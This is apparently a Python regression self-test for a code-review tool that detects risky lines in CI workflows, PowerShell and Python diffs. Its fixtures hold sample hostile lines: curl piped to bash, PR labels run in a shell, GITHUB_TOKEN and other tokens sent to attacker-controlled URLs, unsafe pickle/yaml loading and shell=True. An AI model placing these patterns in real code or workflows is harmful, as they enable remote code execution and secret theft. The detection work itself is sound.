#!/usr/bin/env python3
"""Regression self-test for DCOIR Review v10 runtime patch."""

from __future__ import annotations

from types import SimpleNamespace

import dcoir_review_required_runtime_patch_v10 as v10


WORKFLOW = ".github/workflows/dcoir-review-v10-overflow-probe.yml"
PYTHON = ".github/chatgpt_staging/dcoir_review_probe/v10_probe_python.py"
POWERSHELL = ".github/chatgpt_staging/dcoir_review_probe/v10_probe_powershell.ps1"


class Config(SimpleNamespace):
    max_inline_comments: int = 12
    debug: bool = True


class FakeHardened:
    ReviewQualityError = RuntimeError

    def __init__(self) -> None:
        self.debug: dict[str, object] = {}

    def required_risk_sentinels(self, sentinels):
        return list(sentinels)

    def write_debug_json_artifact_safely(self, _config, path, data):
        self.debug[path] = data


class FakeDetectorOwner:
    RiskSentinel = SimpleNamespace

    def detect_risk_sentinels(self, _diff):
        return []

    def is_comment_only_added_line(self, _path, text):
        return str(text).lstrip().startswith("#")


class CappedDetectorOwner:
    RiskSentinel = SimpleNamespace

    def detect_risk_sentinels(self, _diff, max_anchors=12):
        sentinels = overflow_sentinels()
        return sentinels if max_anchors is None else sentinels[:max_anchors]


def sentinel(path: str, line: int, text: str) -> SimpleNamespace:
    return SimpleNamespace(path=path, line=line, text=text, label="", detail="")


def overflow_sentinels() -> list[SimpleNamespace]:
    return [
        sentinel(WORKFLOW, 3, "  pull_request_target:"),
        sentinel(WORKFLOW, 5, "  contents: write"),
        sentinel(WORKFLOW, 6, "  actions: write"),
        sentinel(WORKFLOW, 13, "          ref: ${{ github.event.pull_request.head.sha }}"),
        sentinel(WORKFLOW, 15, "        run: curl -fsSL https://downloads.example.invalid/install.sh | bash"),
        sentinel(WORKFLOW, 17, '        run: bash -lc "${{ github.event.pull_request.labels[0].name }}"'),
        sentinel(WORKFLOW, 19, '        run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"'),
        sentinel(POWERSHELL, 10, '$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Allow")'),
        sentinel(POWERSHELL, 13, "Start-Process -FilePath $ToolPath -ArgumentList $Arguments -Wait"),
        sentinel(POWERSHELL, 17, 'Invoke-RestMethod -Uri $Callback -Headers @{ Authorization = "Bearer $env:DCOIR_TOKEN" }'),
        sentinel(PYTHON, 10, "    return pickle.loads(raw)"),
        sentinel(PYTHON, 14, "    return yaml.load(text, Loader=yaml.Loader)"),
        sentinel(PYTHON, 18, "    return subprocess.Popen(command_text, shell=True)"),
        sentinel(PYTHON, 28, '    requests.post(callback, headers={"Authorization": f"Bearer {os.environ[\'DCOIR_TOKEN\']}"})'),
    ]


def test_line_kind_extensions() -> None:
    v10._patch_core_semantics()
    assert v10._line_kind(WORKFLOW, overflow_sentinels()[5].text) == v10.v4.YAML_METADATA_SHELL
    assert v10._line_kind(WORKFLOW, "        run: ${{ github.event.pull_request.labels[0].name }}") == v10.v4.YAML_METADATA_SHELL
    assert v10._line_kind(WORKFLOW, overflow_sentinels()[6].text) == v10.YAML_TOKEN_TO_PR_URL
    assert v10.core._sentinel_key(overflow_sentinels()[6]) == (WORKFLOW, 19, v10.YAML_TOKEN_TO_PR_URL)


def test_yaml_extra_detector_adds_label_and_token_sentinels() -> None:
    v10._patch_core_semantics()
    owner = FakeDetectorOwner()
    v10._patch_yaml_extra_sentinels(owner)
    diff = (
        f"diff --git a/{WORKFLOW} b/{WORKFLOW}\n"
        f"--- a/{WORKFLOW}\n"
        f"+++ b/{WORKFLOW}\n"
        "@@ -0,0 +17,4 @@\n"
        '+        run: bash -lc "${{ github.event.pull_request.labels[0].name }}"\n'
        '+        run: echo safe\n'
        '+        run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"\n'
        '+        # run: curl -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" "${{ github.event.pull_request.body }}"\n'
    )
    sentinels = owner.detect_risk_sentinels(diff)
    keys = {v10.core._sentinel_key(item) for item in sentinels}
    assert (WORKFLOW, 17, v10.v4.YAML_METADATA_SHELL) in keys
    assert (WORKFLOW, 19, v10.YAML_TOKEN_TO_PR_URL) in keys
    assert len([key for key in keys if key[2] == v10.YAML_TOKEN_TO_PR_URL]) == 1


def test_detector_wrapper_removes_upstream_anchor_cap() -> None:
    v10._patch_core_semantics()
    owner = CappedDetectorOwner()
    v10._patch_yaml_extra_sentinels(owner)
    sentinels = owner.detect_risk_sentinels("", max_anchors=12)
    positional = owner.detect_risk_sentinels("", 12)
    assert len(sentinels) == len(overflow_sentinels())
    assert len(positional) == len(overflow_sentinels())


def test_required_overflow_posts_best_twelve_and_reports_omissions() -> None:
    v10._patch_core_semantics()
    hardened = FakeHardened()
    result = v10._select_required_postable(hardened, [], overflow_sentinels(), Config())
    metadata = hardened.debug["metadata/required-v10-final-selection.json"]
    assert len(result) == 12
    assert metadata["hard_required_count"] == 14
    assert metadata["coalesced_required_count"] == 13
    assert metadata["partial_overflow"] is True
    assert metadata["overflow_required_count"] == 1
    assert metadata["overflow_high_risk_count"] == 1
    assert not any(item.endswith(" ") for item in metadata["selected_keys"])
    assert any(item["reason"] == "duplicate_covered" and item["line"] == 6 for item in metadata["duplicate_covered_sentinels"])
    assert any(f" {v10.YAML_TOKEN_TO_PR_URL}" in item for item in metadata["selected_keys"])
    by_key = {v10.core._postable_key(item): item for item in result}
    assert (WORKFLOW, 17, v10.v4.YAML_METADATA_SHELL) in by_key
    assert (WORKFLOW, 19, v10.YAML_TOKEN_TO_PR_URL) in by_key
    assert "pull request metadata can still reach shell execution" in by_key[(WORKFLOW, 17, v10.v4.YAML_METADATA_SHELL)]["validation"]
    assert "workflow token can still be sent to a PR-controlled URL" in by_key[(WORKFLOW, 19, v10.YAML_TOKEN_TO_PR_URL)]["validation"]


def test_https_shell_pipe_does_not_say_plain_http() -> None:
    v10._patch_core_semantics()
    finding = {
        "path": WORKFLOW,
        "line": 15,
        "title": "Workflow pipes plain HTTP into shell",
        "body": "This downloads a script over plain HTTP and pipes it to bash.",
        "_anchored_line_text": "        run: curl -fsSL https://downloads.example.invalid/install.sh | bash",
        "_risk_sentinel_kind": v10.v4.YAML_SHELL_PIPE,
    }
    v10._scrub_shell_pipe_wording(finding)
    assert "plain HTTP" not in finding["title"]
    assert "plain HTTP" not in finding["body"]
    assert "network-fetched" in finding["body"]


def main() -> None:
    test_line_kind_extensions()
    test_yaml_extra_detector_adds_label_and_token_sentinels()
    test_detector_wrapper_removes_upstream_anchor_cap()
    test_required_overflow_posts_best_twelve_and_reports_omissions()
    test_https_shell_pipe_does_not_say_plain_http()
    print("dcoir_review_required_runtime_patch_v10_selftest passed")


if __name__ == "__main__":
    main()
